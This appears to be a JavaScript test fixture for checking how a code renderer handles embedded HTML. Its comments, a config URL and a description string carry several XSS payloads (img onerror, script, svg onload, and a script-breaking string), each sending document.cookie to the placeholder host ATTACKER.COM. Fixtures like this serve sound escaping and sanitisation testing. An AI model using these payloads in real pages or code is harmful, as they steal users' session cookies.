// Test file for code rendering
// <img src=x onerror="fetch('https://ATTACKER.COM/js-comment?c='+document.cookie)">

/*
<script>fetch('https://ATTACKER.COM/js-block-comment?c='+document.cookie)</script>
*/

const config = {
  // <svg onload=fetch('https://ATTACKER.COM/js-inline?c='+document.cookie)>
  apiUrl: "https://ATTACKER.COM/beacon/js-string",
  description: "</script><img src=x onerror=fetch('https://ATTACKER.COM/js-string-escape?c='+document.cookie)>",
};

function test() {
  return config;
}

module.exports = test;
